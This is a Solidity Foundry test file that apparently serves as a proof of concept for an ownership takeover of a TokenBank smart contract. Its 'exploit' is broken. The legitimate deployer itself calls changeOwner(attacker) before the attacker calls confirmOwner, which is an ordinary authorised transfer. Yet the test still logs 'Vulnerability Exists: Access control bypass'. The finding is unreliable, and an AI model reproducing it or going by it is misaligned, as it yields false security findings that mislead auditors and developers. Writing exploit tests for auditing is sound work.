// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract TokenBankExploitTest is Test {
    TokenBank public bank;
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.prank(deployer);
        bank = new TokenBank();
    }

    function test_ownershipTakeOver() public {
        console.log("--- BEFORE-Trigger State ---");
        bytes32 ownerSlotBefore;
        address ownerBefore;
        // Read storage slot 0 to get initial owner
        ownerSlotBefore = vm.load(address(bank), bytes32(0));
        ownerBefore = address(uint160(uint256(ownerSlotBefore)));
        console.log("Current owner: %s", ownerBefore);
        
        console.log("--- Trigger: Execute Ownership Change Steps ---");
        // 1. Current owner designates attacker as newOwner
        vm.prank(deployer);
        bank.changeOwner(attacker);

        // 2. Attacker exploits vulnerable confirmOwner to become owner
        vm.prank(attacker);
        bank.confirmOwner();

        console.log("--- AFTER-Trigger State ---");
        bytes32 ownerSlotAfter;
        address ownerAfter;
        // Read storage slot again to get new owner
        ownerSlotAfter = vm.load(address(bank), bytes32(0));
        ownerAfter = address(uint160(uint256(ownerSlotAfter)));
        console.log("New owner: %s", ownerAfter);

        // Final verification and verdict
        if (ownerAfter == attacker) {
            console.log("Vulnerability Exists: Access control bypass allows unauthorized takeover");
        } else {
            console.log("Vulnerability not Exist: Ownership protocol prevents unauthorized takeover");
        }
    }
}